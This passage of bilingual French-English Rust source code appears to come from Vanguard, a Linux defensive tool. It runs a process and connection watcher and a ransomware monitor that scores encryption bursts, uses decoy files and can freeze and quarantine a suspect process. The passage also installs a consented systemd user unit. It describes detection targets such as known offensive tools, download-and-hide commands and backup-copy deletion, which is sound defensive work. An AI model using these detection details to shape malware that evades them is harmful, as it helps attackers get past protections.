        etat.raison_arret = Some(raison);
        ecrire_etat(etat);
        SORTIE_REFUS
    };
    if root() {
        return refuser(
            &mut etat,
            tr!(
                "Le veilleur ne tourne jamais en root : il se pose pour un compte ordinaire.",
                "The watcher never runs as root: it is set up for an ordinary account."
            )
            .to_string(),
        );
    }
    if let Some(r) = release_du_noyau()
        && noyau_suffisant(&r) == Some(false)
    {
        return refuser(&mut etat, noyau_trop_ancien(&r));
    }
    // Avant l'ouverture : un arrêt pendant l'attente de l'accusé ou la lecture de /proc tuerait sinon le processus
    // par l'action par défaut du signal, sans le désabonnement.
    ecouter_les_signaux();
    let mut v = match Veilleur::ouvrir() {
        Ok(v) => v,
        Err(refus) => {
            let raison = refus.raison();
            eprintln!("{raison}");
            etat.raison_arret = Some(raison);
            ecrire_etat(&etat);
            return refus.sortie();
        }
    };
    etat.tampon = v.tampon();
    etat.sans_prises = v.prises.as_ref().err().map(Refus::raison);
    etat.masque = super::dissimulation::proc_masque(&std::fs::read_to_string("/proc/self/mounts").unwrap_or_default());
    let (mut serveurs, absentes) = crate::protection::sortantes::serveurs_gardes();
    etat.listes = (!absentes.is_empty()).then(|| absentes.join(" ; "));
    etat.en_pause = crate::protection::temps_reel::coupure().is_some();
    v.lire = !etat.en_pause;
    ecrire_etat(&etat);
    let mut debit = Debit::default();
    let mut fichiers = crate::protection::sources::Fichiers::recentes();
    let mut empreintes_relues = Instant::now();
    // Allumé par une version d'avant (ses marques, rien de noté) : noté voulu dès le démarrage, sans attendre un
    // bilan. Sa marque effacée ensuite ne le coupe plus au démarrage suivant.
    adopter_les_marques();
    // La veille des dossiers personnels, si elle est voulue (accord séparé, dans le même « on »).
    let mut rancon = construire_veille(&mut etat);
    ecrire_etat(&etat);
    let (mut minute, mut quart) = (Instant::now(), Instant::now());
    let sortie = loop {
        if ARRET.load(Ordering::SeqCst) {
            etat.raison_arret = Some(tr!("arrêt demandé", "stop requested").to_string());
            break 0;
        }
        let vus = match v.tour(Duration::from_secs(1)) {
            Ok(vus) => vus,
            Err(e) => {
                etat.raison_arret = Some(trf!(
                    "erreur de lecture du noyau ({})",
                    "kernel read error ({})",
                    std::io::Error::from_raw_os_error(e)
                ));
                break 1;
            }
        };
        // En pause, ce qui arrive est lu puis jeté : rien n'est noté ni notifié.
        if !etat.en_pause {
            for vu in vus {
                // R7 : l'effacement des copies de secours, vu dans le flux des processus, nourrit la veille.
                if let (Some(r), Vu::Lance(l)) = (rancon.as_mut(), &vu)
                    && let Lecture::Complet(p) = &l.lecture
                    && crate::protection::rancongiciel::copies::effacement(p, Os::Linux).is_some()
                {
                    r.noter_copies(Copies::SessionHorsRafale);
                }
                traiter(vu, &mut etat, &mut debit, &serveurs, &mut fichiers);
            }
            if let Some(r) = rancon.as_mut() {
                tour_rancon(r, &mut etat, &mut debit);
            }
            if let Some(n) = debit.resume(maintenant()) {
                tableau::noter_alerte(
                    Genre::Veilleur,
                    tr!(
                        "Vanguard : veilleur, alertes en rafale",
                        "Vanguard: watcher, burst of alerts"
                    ),
                    &trf!(
                        "{n} autre(s) alerte(s) du veilleur non notée(s), pour ne pas inonder le journal : lancez « vanguard audit » pour un bilan complet.",
                        "{n} other watcher alert(s) not noted, so as not to flood the log: run “vanguard audit” for a full check."
                    ),
                );
            }
        } else if let Some(r) = rancon.as_mut() {
            // En pause, les changements de fichiers sont jetés comme les lancements : le canal ne gonfle pas, et rien
            // ne se tasse dans une même fenêtre au retour.
            r.jeter();
        }
        if minute.elapsed() >= Duration::from_mins(1) {
            minute = Instant::now();
            etat.en_pause = crate::protection::temps_reel::coupure().is_some();
            v.lire = !etat.en_pause;
            etat.battement = maintenant();
            etat.non_haches += fichiers.prendre_non_haches() as u64;
            ecrire_etat(&etat);
        }
        if quart.elapsed() >= Duration::from_mins(15) {
            quart = Instant::now();
            let (nouveaux, absentes) = crate::protection::sortantes::serveurs_gardes();
            serveurs = nouveaux;
            etat.listes = (!absentes.is_empty()).then(|| absentes.join(" ; "));
        }
        // Les empreintes récentes, rafraîchies chaque jour par la surveillance : relues toutes les 6 heures.
        if empreintes_relues.elapsed() >= Duration::from_hours(6) {
            empreintes_relues = Instant::now();
            etat.non_haches += fichiers.prendre_non_haches() as u64;
            fichiers = crate::protection::sources::Fichiers::recentes();
        }
    };
    // Le désabonnement part ici, avant l'état final.
    drop(v);
    etat.battement = maintenant();
    etat.non_haches += fichiers.prendre_non_haches() as u64;
    ecrire_etat(&etat);
    sortie
}

// ───────────────────────────── Veille anti-rançongiciel ─────────────────────────────

/// Construit la veille des dossiers personnels si elle est voulue ; met à jour l'état (en marche, ou pourquoi pas).
fn construire_veille(etat: &mut Etat) -> Option<veille::Veille> {
    if !rancon_voulu() {
        return None;
    }
    let reglages = Reglages::charger();
    let mut dossiers = crate::protection::pieges::dossiers_a_veiller();
    for d in &reglages.dossiers_en_plus {
        let p = PathBuf::from(d);
        if p.is_dir() {
            dossiers.push(p);
        }
    }
    dossiers.sort();
    dossiers.dedup();
    let pieges: HashSet<PathBuf> = crate::protection::pieges::chemins_poses().into_iter().collect();
    if let Some(v) = veille::Veille::demarrer(&dossiers, pieges) {
        etat.rancon_actif = true;
        etat.rancon_sans = None;
        Some(v)
    } else {
        etat.rancon_actif = false;
        etat.rancon_sans = Some(
            tr!(
                "surveillance des fichiers indisponible (aucun dossier à suivre, ou inotify saturé)",
                "file watching unavailable (no folder to watch, or inotify exhausted)"
            )
            .to_string(),
        );
        None
    }
}

/// Un tour de la veille des fichiers : vider le canal, juger la fenêtre, puis alerter ou (quasi certain) geler et
/// arrêter.
fn tour_rancon(v: &mut veille::Veille, etat: &mut Etat, debit: &mut Debit) {
    v.absorber();
    etat.rancon_changements = v.changements_vus;
    etat.rancon_perdus += v.prendre_perdus();
    let maintenant_i = Instant::now();
    let (s, reecrits) = v.signaux(maintenant_i);
    // L'attribution (deux relevés à ~1 s) n'a lieu que si tout le reste atteint déjà le quasi-certain : rare, et elle
    // seule justifie son coût.
    let (attribution_sure, groupe) = if score::juger(&s, true) == Verdict::QuasiCertain {
        match veille::attribuer(v, &reecrits) {
            Attribution::Une(g) => (true, Some(g)),
            Attribution::Plusieurs | Attribution::Aucune => (false, None),
        }
    } else {
        (false, None)
    };
    match score::juger(&s, attribution_sure) {
        Verdict::Calme => {}
        Verdict::QuasiCertain => {
            if let Some(g) = groupe {
                repondre_quasi_certain(g, &s, etat, debit);
            }
        }
        verdict => alerter_rafale(verdict, &s, groupe, debit),
    }
}

/// Le programme d'un groupe : son nom court et son chemin, lus maintenant.
fn programme_du_groupe(pid: u32) -> (String, Option<PathBuf>) {
    let nom = crate::socle::processus::nom_court(pid).unwrap_or_default();
    let chemin = crate::socle::processus::programme(pid).map(|c| {
        PathBuf::from(
            c.to_string_lossy()
                .strip_suffix(" (deleted)")
                .unwrap_or(&c.to_string_lossy())
                .to_string(),
        )
    });
    (nom, chemin)
}

/// Quasi certain : gel + preuve + arrêt + quarantaine, si la protection active le permet ; sinon une alerte Grave avec
/// « Bloquer » proposé au prochain bilan.
fn repondre_quasi_certain(groupe: u32, s: &score::Signaux, etat: &mut Etat, debit: &mut Debit) {
    let (nom, chemin) = programme_du_groupe(groupe);
    let objet = chemin
        .as_ref()
        .map_or_else(|| format!("pid:{groupe}"), |c| c.to_string_lossy().into_owned());
    let cle = format!("veilleur|rancongiciel|{objet}");
    let nom_aff = crate::ui::affichable(&nom);
    let detection = trf!(
        "rançongiciel quasi certain : {} fichiers chiffrés dans {} dossiers, un piège touché",
        "almost certain ransomware: {} files encrypted across {} folders, a decoy touched",
        s.reecrits,
        s.dossiers
    );
    // Si la personne l'a déjà déclaré normal (un outil de chiffrement voulu), rien tout seul.
    let cle_normale = crate::protection::normales::cle_veilleur(&format!("rancongiciel|{objet}"));
    if crate::protection::normales::est_normale(&cle_normale) {
        return;
    }
    if !crate::protection::blocage::arret_automatique_programmes_permis() {
        // Alerte Grave, « Bloquer » proposé au bilan ; jamais d'arrêt sans la protection active.
        let titre = tr!("Vanguard : rançongiciel possible", "Vanguard: possible ransomware");
        let texte = trf!(
            "{nom_aff} a réécrit {} de vos fichiers dans {} dossiers, et leur contenu ne ressemble plus à leur format (chiffré). Coupez Internet et débranchez vos disques de sauvegarde, puis ouvrez Vanguard pour le bloquer.",
            "{nom_aff} rewrote {} of your files across {} folders, and their content no longer matches their format (encrypted). Cut the Internet and unplug your backup drives, then open Vanguard to block it.",
            s.reecrits,
            s.dossiers
        );
        noter_rancon(debit, &cle, true, titre, &texte);
        return;
    }
    let cible = reponse::Cible {
        racine: groupe,
        nom,
        chemin: chemin.clone(),
        fichier: chemin,
        detection: detection.clone(),
        cle: cle.clone(),
    };
    match reponse::geler_et_arreter(&cible, || veille::lignee_de(groupe)) {
        reponse::Issue::Arrete(_) => {
            etat.rancon_gels += 1;
            etat.rancon_rafales += 1;
            let titre = tr!("Vanguard : rançongiciel arrêté", "Vanguard: ransomware stopped");
            let texte = trf!(
                "{nom_aff} chiffrait vos fichiers et a touché un fichier-piège. Vanguard l'a gelé, a relevé la preuve, puis l'a arrêté et mis en quarantaine. {} fichiers ont été touchés avant l'arrêt : la liste est dans « Ce que Vanguard a changé ».",
                "{nom_aff} was encrypting your files and touched a decoy file. Vanguard froze it, recorded the evidence, then stopped and quarantined it. {} files were touched before the stop: the list is in “What Vanguard changed”.",
                s.reecrits
            );
            // Toujours notifier un arrêt automatique, même si la clé a été dite normale avant.
            crate::reseau::surveillance::alerter_cle(crate::reseau::tableau::Genre::Rancongiciel, &cle, titre, &texte);
        }
        reponse::Issue::Gele { raison, geles } => {
            // Ajoutés, pas remplacés : un second gel ne doit pas faire oublier le premier.
            etat.pids_geles.extend(geles);
            etat.pids_geles.sort_unstable();
            etat.pids_geles.dedup();
            let titre = tr!("Vanguard : rançongiciel gelé", "Vanguard: ransomware frozen");
            // Seul ce qui existe est proposé : aucun écran n'offre encore « Reprendre » ni « Arrêter » à part.
            let texte = trf!(
                "{nom_aff} est gelé, pas arrêté : {raison}. Si c'est vous : vanguard veilleur rancongiciel off le reprend (et coupe la surveillance des fichiers).",
                "{nom_aff} is frozen, not stopped: {raison}. If it was you: vanguard watcher ransomware off resumes it (and turns file watching off)."
            );
            crate::reseau::surveillance::alerter_cle(crate::reseau::tableau::Genre::Rancongiciel, &cle, titre, &texte);
        }
        reponse::Issue::Refuse(raison) => {
            let titre = tr!("Vanguard : rançongiciel possible", "Vanguard: possible ransomware");
            let texte = trf!(
                "Des fichiers sont chiffrés en rafale, mais Vanguard ne peut pas geler le programme ({raison}) : rien n'est arrêté tout seul. Coupez Internet et ouvrez Vanguard.",
                "Files are being encrypted in a burst, but Vanguard cannot freeze the program ({raison}): nothing is stopped automatically. Cut the Internet and open Vanguard."
            );
            noter_rancon(debit, &cle, true, titre, &texte);
        }
    }
}

/// Suspect ou Grave sans attribution sûre : une alerte, nommée si un seul groupe est connu, « non attribué » sinon.
fn alerter_rafale(verdict: Verdict, s: &score::Signaux, groupe: Option<u32>, debit: &mut Debit) {
    let grave = verdict >= Verdict::Grave;
    let (cle, texte) = match groupe.map(programme_du_groupe) {
        Some((nom, chemin)) => {
            let objet = chemin
                .as_ref()
                .map_or_else(|| "rafale".to_string(), |c| c.to_string_lossy().into_owned());
            let nom_aff = crate::ui::affichable(&nom);
            (
                format!("veilleur|rancongiciel|{objet}"),
                trf!(
                    "{nom_aff} a réécrit {} de vos fichiers dans {} dossiers, et leur contenu ne ressemble plus à leur format (chiffré). Coupez Internet et débranchez vos disques de sauvegarde, puis ouvrez Vanguard pour le bloquer.",
                    "{nom_aff} rewrote {} of your files across {} folders, and their content no longer matches their format (encrypted). Cut the Internet and unplug your backup drives, then open Vanguard to block it.",
                    s.reecrits,
                    s.dossiers
                ),
            )
        }
        None => (
            "veilleur|rancongiciel|rafale".to_string(),
            trf!(
                "Des fichiers sont chiffrés en rafale ({} dans {} dossiers), mais Vanguard ne sait pas quel programme le fait (non vérifié) : rien n'est arrêté tout seul. Coupez Internet et ouvrez Vanguard.",
                "Files are being encrypted in a burst ({} across {} folders), but Vanguard cannot tell which program is doing it (not verified): nothing is stopped automatically. Cut the Internet and open Vanguard.",
                s.reecrits,
                s.dossiers
            ),
        ),
    };
    let titre = tr!("Vanguard : rançongiciel possible", "Vanguard: possible ransomware");
    noter_rancon(debit, &cle, grave, titre, &texte);
}

/// Note une alerte de la veille des fichiers, au débit du veilleur ; notifie si grave.
fn noter_rancon(debit: &mut Debit, cle: &str, grave: bool, titre: &str, texte: &str) {
    use crate::reseau::tableau::Genre;
    if crate::protection::normales::est_normale(cle) {
        return;
    }
    match debit.decider(cle, grave, maintenant()) {
        Decision::Noter { notifier: true } => {
            crate::reseau::surveillance::alerter_cle(Genre::Rancongiciel, cle, titre, texte);
        }
        Decision::Noter { notifier: false } => {
            tableau::noter_alerte_cle(Genre::Rancongiciel, Some(cle), titre, texte);
        }
        Decision::Repete | Decision::Taire => {}
    }
}

/// Un événement vu : compté, puis jugé et noté selon le débit.
fn traiter(
    vu: Vu,
    etat: &mut Etat,
    debit: &mut Debit,
    serveurs: &ServeursDeCommande,
    fichiers: &mut crate::protection::sources::Fichiers,
) {
    let alerte = match vu {
        Vu::Perdus(n) => {
            etat.perdus += u64::from(n);
            None
        }
        Vu::Prise(f) => {
            etat.prises += 1;
            juger_prise(&f, serveurs)
        }
        Vu::Lance(l) => {
            etat.lancements += 1;
            match &l.lecture {
                Lecture::Complet(p) => {
                    etat.lus += 1;
                    if p.chemin.is_none() {
                        etat.sans_programme += 1;
                    }
                }
                Lecture::NomSeul(_) => etat.noms_seuls += 1,
                Lecture::NonLu => etat.non_lus += 1,
                Lecture::Parti => {
                    etat.partis += 1;
                    if etat.derniers_partis.len() >= DERNIERS_PARTIS {
                        etat.derniers_partis.remove(0);
                    }
                    etat.derniers_partis.push((l.pid, l.parent));
                }
            }
            juger_lance_avec(&l, fichiers)
        }
    };
    let Some(a) = alerte else { return };
    let cle = crate::protection::normales::cle_veilleur(&a.cle);
    // Déclarée normale ici (« Ce que Vanguard a appris ») : ni notée ni notifiée, tant que le choix vaut. Lu
    // seulement quand le débit la laisserait passer : une alerte répétée mille fois ne relit pas mille fois la liste.
    let normale = || crate::protection::normales::est_normale(&cle);
    match debit.decider(&a.cle, a.grave, maintenant()) {
        Decision::Noter { .. } if normale() => {}
        Decision::Noter { notifier: true } => {
            crate::reseau::surveillance::alerter_cle(a.genre, &cle, &a.titre, &a.texte);
        }
        Decision::Noter { notifier: false } => tableau::noter_alerte_cle(a.genre, Some(&cle), &a.titre, &a.texte),
        Decision::Repete => {}
        Decision::Taire => etat.tus += 1,
    }
}

fn noyau_trop_ancien(release: &str) -> String {
    trf!(
        "Linux {} : le veilleur demande Linux 6.6 ou plus récent, le premier qui ouvre le connecteur de processus aux comptes ordinaires. Rien n'est installé.",
        "Linux {}: the watcher needs Linux 6.6 or later, the first to open the process connector to ordinary accounts. Nothing is installed.",
        crate::ui::affichable(release)
    )
}

// ───────────────────────────── L'unité ─────────────────────────────

const MARQUE_FR: &str = "# Posé par Vanguard (vanguard veilleur on)";
const MARQUE_EN: &str = "# Placed by Vanguard (vanguard watcher on)";

pub(crate) fn fichier_unite() -> PathBuf {
    crate::socle::maison().join(".config/systemd/user").join(UNITE)
}

/// Le texte de l'unité, dans la langue demandée. Le chemin entre guillemets (un dossier personnel peut contenir une
/// espace), « % » doublé (spécificateurs de systemd), comme la surveillance.
fn unite_dans(exe: &str, anglais: bool) -> String {
    let exe = format!("\"{}\"", exe.replace('%', "%%").replace('"', "\\\""));
    // Le durcissement : ce qui garde l'accusé du connecteur dans une unité de l'utilisateur (mesuré une option à la
    // fois puis toutes ensemble). Sans Nice : plus le veilleur est servi tard, plus un programme bref part avant
    // d'être lu.
    let durcissement = "Restart=on-failure\nRestartSec=30s\n";
    let limites = "RestartPreventExitStatus=77\nCPUQuota=20%\nMemoryMax=128M\nTasksMax=16\nUMask=0077\n\
                   NoNewPrivileges=yes\nLockPersonality=yes\nMemoryDenyWriteExecute=yes\nRestrictRealtime=yes\n\
                   RestrictSUIDSGID=yes\nRestrictNamespaces=yes\nSystemCallArchitectures=native\n\
                   SystemCallFilter=@system-service\nRestrictAddressFamilies=AF_UNIX AF_NETLINK\n";
    if anglais {
        format!(
            "{MARQUE_EN};\n# “vanguard watcher off” removes it.\n[Unit]\nDescription=Vanguard: watcher\nStartLimitIntervalSec=1h\nStartLimitBurst=5\n\n[Service]\nType=simple\nExecStart={exe} veilleur --servir\n# One tokio worker: one per core would exceed TasksMax.\nEnvironment=TOKIO_WORKER_THREADS=1\n{durcissement}# 77: kernel too old or kernel refusal; a restart changes nothing.\n{limites}# No ProtectSystem, ProtectHome, PrivateTmp, ReadOnlyPaths,\n# ReadWritePaths, ProtectKernel*, ProtectControlGroups, PrivateDevices\n# or PrivateUsers: in a user unit, they create a user namespace where\n# the kernel ignores the connector subscription (measured: no ack).\n# No Nice: the later the watcher runs, the more a brief program is gone\n# before it is read.\n\n[Install]\nWantedBy=default.target\n"
        )
    } else {
        format!(
            "{MARQUE_FR} ;\n# « vanguard veilleur off » le retire.\n[Unit]\nDescription=Vanguard : veilleur\nStartLimitIntervalSec=1h\nStartLimitBurst=5\n\n[Service]\nType=simple\nExecStart={exe} veilleur --servir\n# Un seul fil de travail pour tokio : un par cœur dépasserait TasksMax.\nEnvironment=TOKIO_WORKER_THREADS=1\n{durcissement}# 77 : noyau trop ancien ou refus du noyau ; relancer n'y change rien.\n{limites}# Ni ProtectSystem, ProtectHome, PrivateTmp, ReadOnlyPaths,\n# ReadWritePaths, ProtectKernel*, ProtectControlGroups, PrivateDevices\n# ni PrivateUsers : dans une unité de l'utilisateur, ils créent un\n# espace de noms d'utilisateur où le noyau ignore l'abonnement au\n# connecteur (mesuré : plus d'accusé).\n# Pas de Nice : plus le veilleur est servi tard, plus un programme bref\n# part avant d'être lu.\n\n[Install]\nWantedBy=default.target\n"
        )
    }
}

fn unite(exe: &str) -> String {
    unite_dans(exe, crate::langue::anglais())
}

/// L'unité telle que « on » la pose, pour les essais d'autres modules (la désinstallation la reconnaît).
#[cfg(test)]
pub(crate) fn unite_d_essai(exe: &str, anglais: bool) -> String {
    unite_dans(exe, anglais)
}

/// Est-ce l'unité de Vanguard ? Sa première ligne est notre marque, dans l'une ou l'autre langue : une unité du même
/// nom posée par quelqu'un d'autre n'est jamais effacée.
pub(crate) fn notre_unite(texte: &str) -> bool {
    texte
        .lines()
        .next()
        .is_some_and(|l| l.starts_with(MARQUE_FR) || l.starts_with(MARQUE_EN))
}

/// Le programme que l'unité lancera : la copie locale si Vanguard tourne depuis la clé (`surveillance::executable`
/// la fait, mais seulement après l'accord).
fn exe_prevu() -> Option<String> {
    let exe = crate::protection::cle::exe_d_origine()?;
    if crate::reseau::cle_usb().is_some_and(|cle| exe.starts_with(&cle)) {
        return Some(crate::mise_a_jour::copie_de_cet_ordinateur().display().to_string());
    }
    Some(exe.display().to_string())
}

fn explication() -> &'static str {
    tr!(
        "Le veilleur voit chaque programme lancé sur cet ordinateur, de tous les comptes, même s'il ne vit que quelques millisecondes, et chaque connexion TCP ou UDP au moment où elle se ferme. Il les juge comme le bilan (outil offensif connu, commande qui télécharge ou cache ce qu'elle lance) et contre les serveurs de commande de botnets déjà téléchargés par la surveillance ou le bilan. Il n'envoie rien, et garde les alertes au tableau de bord (vanguard tableau-de-bord). Après l'allumage, il vous propose aussi de surveiller vos dossiers personnels contre les rançongiciels : avec la protection active, il peut alors geler puis arrêter un rançongiciel quasi certain. Un programme parti avant d'être lu est compté tel quel, jamais jugé sain ; le programme d'une connexion fermée n'est pas connu (le noyau ne le donne pas). Il tourne pendant votre session ouverte, sans droits d'administrateur ni code chargé dans le noyau.",
        "The watcher sees each program started on this computer, from every account, even one that lives only a few milliseconds, and each TCP or UDP connection as it closes. It judges them as the check does (known offensive tool, command that downloads or hides what it runs) and against the botnet command servers already downloaded by the monitoring or the check. It sends nothing, and keeps the alerts on the dashboard (vanguard dashboard). After it is turned on, it also offers to watch your personal folders against ransomware: with active protection, it can then freeze and stop an almost certain ransomware. A program gone before it could be read is counted as such, never judged safe; the program of a closed connection is not known (the kernel does not give it). It runs while your session is open, without administrator rights or code loaded into the kernel."
    )
}

fn allumer() {
    if root() {
        trp!(
            "  ✖ En root, rien n'est posé : le veilleur se pose pour votre compte. Relancez sans sudo.",
            "  ✖ As root, nothing is set up: the watcher is set up for your account. Run it again without sudo."
        );
        return;
    }
    if let Some(r) = release_du_noyau()
        && noyau_suffisant(&r) == Some(false)
    {
        trp!("  ✖ {}", "  ✖ {}", noyau_trop_ancien(&r));
        return;
    }
    // L'essai sur le vrai noyau, 2 secondes au plus : ce qui ne s'ouvre pas ici ne s'ouvrira pas dans l'unité. Un
    // Ctrl-C pendant l'essai laisse partir le désabonnement ; l'action d'avant revient ensuite, pour la question.
    ARRET.store(false, Ordering::SeqCst);
    let avant = ecouter_les_signaux();
    let essai = Veilleur::ouvrir().map(drop);
    remettre_les_signaux(&avant);
    let interrompu = ARRET.swap(false, Ordering::SeqCst);
    if let Err(refus) = essai {
        trp!("  ✖ {}", "  ✖ {}", refus.raison());
        return;
    }
    if interrompu {
        trp!("  ✖ {}", "  ✖ {}", Refus::Arrete.raison());
        return;
    }
    if crate::machine::linux::natif::unite_activee(UNITE, true).is_none() {
        trp!(
            "  ✖ systemd de l'utilisateur introuvable : le veilleur est un de ses services. Rien n'est installé.",
            "  ✖ User systemd not found: the watcher is one of its services. Nothing is installed."
        );
        return;
    }
    let Some(exe) = exe_prevu().filter(|e| !e.contains(['\n', '\r'])) else {
        trp!(
            "  ✖ Le chemin de Vanguard ne se lit pas : rien n'est installé.",
            "  ✖ Vanguard's path cannot be read: nothing is installed."
        );
        return;
    };
    let chemin = fichier_unite();
    if let Err(raison) = place_libre(std::fs::read(&chemin)) {
        trp!("  ✖ {}", "  ✖ {}", raison);
        return;
    }
    let texte = unite(&exe);
    afficher_aligne("  ", explication(), 2, "");
    println!();
    trp!(
        "  Voici l'unité qui sera posée : {}",
        "  Here is the unit that will be set up: {}",
        crate::ui::chemin_affichable(&chemin)
    );
    for l in texte.lines() {
        println!("    {GRIS}{}{RESET}", crate::ui::affichable(l));
    }
    crate::protection::temps_reel::dire_si_coupee(crate::protection::temps_reel::Ou::Surveillance);
    if !demander(tr!(
        "\n  Allumer le veilleur ? [o/N] : ",
        "\n  Turn the watcher on? [y/N]: "
    ))
    .oui()
    {
        trp!("  Rien n'est posé.", "  Nothing is set up.");
        return;
    }
    // La copie locale (Vanguard lancé depuis la clé) se fait maintenant, après l'accord ; un autre chemin que celui
    // montré, et rien n'est posé.
    let reel = crate::reseau::surveillance::executable();
    if reel.as_deref() != Some(exe.as_str()) {
        trp!(
            "  ✖ La copie locale de Vanguard n'a pas pu se faire ({}) : rien n'est posé.",
            "  ✖ The local copy of Vanguard could not be made ({}): nothing is set up.",
            crate::ui::affichable(&exe)
        );
        return;
    }
    // Revu juste avant d'écrire : une unité étrangère posée pendant la question n'est pas écrasée non plus.
    if let Err(raison) = place_libre(std::fs::read(&chemin)) {
        trp!("  ✖ {}", "  ✖ {}", raison);
        return;
    }
    // Déjà en marche (un veilleur d'avant une mise à jour) : « enable --now » ne le relance pas, et l'ancien
    // programme resterait en mémoire.
    let deja_active = crate::machine::linux::natif::unite_activee(UNITE, true) == Some(true);
    let ecrit =
        chemin.parent().is_some_and(|d| std::fs::create_dir_all(d).is_ok()) && std::fs::write(&chemin, &texte).is_ok();
    let reussi = ecrit
        && super::dbus::actions::utilisateur(super::dbus::actions::Geste::Recharger, "")
        && super::dbus::actions::utilisateur(super::dbus::actions::Geste::Activer { maintenant: true }, UNITE)
        && (!deja_active || super::dbus::actions::utilisateur(super::dbus::actions::Geste::RedemarrerSiActive, UNITE));
    crate::changements::noter(
        &[vec![
            format!("{} → {}", tr!("écrire", "write"), chemin.display()),
            "systemctl --user daemon-reload".to_string(),
            format!("systemctl --user enable --now {UNITE}"),
        ]],
        &[reussi],
    );
    if !reussi {
        trp!(
            "  ✖ Le veilleur n'a pas pu être allumé (journalctl --user -u {UNITE} dit pourquoi).",
            "  ✖ The watcher could not be turned on (journalctl --user -u {UNITE} tells why)."
        );
        return;
    }
    marquer(&fichier_voulu());
    voulues::noter(Defense::Veilleur, true);
    crate::programmes_poses::noter(
        crate::programmes_poses::Tache::Veilleur,
        std::path::Path::new(&exe),
        &std::fs::read(&chemin),
    );
    std::thread::sleep(Duration::from_secs(3));
    if lire_etat().is_some_and(|e| vivant_d_apres(&e, maintenant()) && e.raison_arret.is_none()) {
        trp!(
            "  {VERT}✔{RESET} Veilleur allumé : ses alertes vont au tableau de bord (vanguard tableau-de-bord), le grave en notification.",
            "  {VERT}✔{RESET} Watcher on: its alerts go to the dashboard (vanguard dashboard), what is serious as a notification."
        );
    } else {
        trp!(
            "  ⚠ Veilleur posé, pas encore vu en marche : « vanguard veilleur » le redit dans un instant ; journalctl --user -u {UNITE} dit pourquoi.",
            "  ⚠ Watcher set up, not seen running yet: “vanguard watcher” tells again in a moment; journalctl --user -u {UNITE} tells why."
        );
    }
    // Dans le même accord : proposer la surveillance des dossiers personnels contre les rançongiciels (point ouvert 6).
    proposer_rancon();
}

/// Peut-on écrire notre unité, d'après ce qui est à sa place (`std::fs::read`) ? Seulement si rien n'y est, ou si
/// c'est déjà la nôtre : une unité du même nom posée par quelqu'un d'autre n'est jamais écrasée, puisque « off » ne
/// pourrait pas la rendre. `Err` : pourquoi rien n'est posé.
fn place_libre(existant: std::io::Result<Vec<u8>>) -> Result<(), String> {
    match existant {
        Ok(octets) if notre_unite(&String::from_utf8_lossy(&octets)) => Ok(()),
        Ok(_) => Err(trf!(
            "Une unité {UNITE} existe déjà et Vanguard ne l'a pas posée : rien n'est posé, elle reste telle quelle.",
            "A {UNITE} unit already exists and Vanguard did not set it up: nothing is set up, it stays as it is."
        )),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(trf!(
            "L'unité {UNITE} déjà en place ne se lit pas ({e}) : rien n'est posé.",
            "The {UNITE} unit already in place cannot be read ({e}): nothing is set up."
        )),
    }
}

fn couper() {
    let chemin = fichier_unite();
    let texte = std::fs::read_to_string(&chemin).ok();
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true) == Some(true);
    if texte.is_none() && !activee && !voulu() {
        trp!(
            "  {VERT}✔{RESET} Le veilleur est déjà coupé : rien à retirer.",
            "  {VERT}✔{RESET} The watcher is already off: nothing to remove."
        );
        // Noté coupé par la personne : un état douteux (ou une marque effacée hors de Vanguard) ne se dit plus.
        oublier_le_choix(&Retire::Fait, &crate::socle::dossier_local());
        return;
    }
    let a_nous = texte.as_deref().is_some_and(notre_unite);
    trp!(
        "  Le veilleur sera arrêté (systemctl --user disable --now {UNITE}).",
        "  The watcher will be stopped (systemctl --user disable --now {UNITE})."
    );
    match (&texte, a_nous) {
        (Some(_), true) => trp!(
            "  Son unité sera retirée : {}",
            "  Its unit will be removed: {}",
            crate::ui::chemin_affichable(&chemin)
        ),
        (Some(_), false) => trp!(
            "  Une unité de ce nom existe, mais Vanguard ne l'a pas posée : elle sera arrêtée et restera en place ({}).",
            "  A unit of that name exists, but Vanguard did not set it up: it will be stopped and stay in place ({}).",
            crate::ui::chemin_affichable(&chemin)
        ),
        (None, _) => {}
    }
    if !demander(tr!(
        "\n  Couper le veilleur ? [o/N] : ",
        "\n  Turn the watcher off? [y/N]: "
    ))
    .oui()
    {
        trp!("  Rien n'est changé.", "  Nothing is changed.");
        return;
    }
    match retirer_sans_question(&chemin, true) {
        Retire::Fait => trp!("  {VERT}✔{RESET} Veilleur coupé.", "  {VERT}✔{RESET} Watcher off."),
        Retire::Echoue(raison) => trp!(
            "  ✖ Le veilleur n'a pas pu être coupé entièrement ({}) : systemctl --user status {UNITE} dit où il en est.",
            "  ✖ The watcher could not be turned off completely ({}): systemctl --user status {UNITE} tells where it stands.",
            raison
        ),
        Retire::NonVerifie(raison) => trp!(
            "  ⚠ Veilleur coupé, sans que ce soit vérifié ({}) : systemctl --user status {UNITE} dit où il en est.",
            "  ⚠ Watcher off, without this being checked ({}): systemctl --user status {UNITE} tells where it stands.",
            raison
        ),
    }
}

/// Ce qu'a donné un retrait du veilleur, constaté après coup.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Retire {
    Fait,
    /// Quelque chose reste (l'unité, l'activation, le service en marche), ou l'unité n'est plus celle de Vanguard.
    Echoue(String),
    /// Rien ne montre qu'il reste, mais systemd n'a pas confirmé l'arrêt.
    NonVerifie(String),
}

/// Arrête le veilleur puis retire son unité `chemin`, sans rien demander : montré et accepté avant, par « vanguard
/// veilleur off » ou par la désinstallation, qui partagent ainsi le même retrait. Une unité du même nom que Vanguard
/// n'a pas posée n'est jamais effacée ; elle est seulement arrêtée si `arreter_l_etrangere` (« off » l'a annoncé),
/// sinon rien n'y est fait. Le retrait est constaté ensuite (unité relue, plus activée, service plus en marche),
/// jamais supposé. La note du choix et l'état partent avec, sans quoi le bilan dirait le veilleur disparu sans avoir
/// été coupé, sauf si quelque chose reste (voir `oublier_le_choix`).
pub(crate) fn retirer_sans_question(chemin: &std::path::Path, arreter_l_etrangere: bool) -> Retire {
    // Relue juste avant : une unité étrangère posée depuis ce qui a été montré n'est pas effacée.
    let presente = std::fs::symlink_metadata(chemin).is_ok();
    let a_nous = std::fs::read(chemin).is_ok_and(|o| notre_unite(&String::from_utf8_lossy(&o)));
    if presente && !a_nous && !arreter_l_etrangere {
        return Retire::Echoue(trf!(
            "{} n'est plus l'unité de Vanguard : gardée telle quelle, rien n'est arrêté",
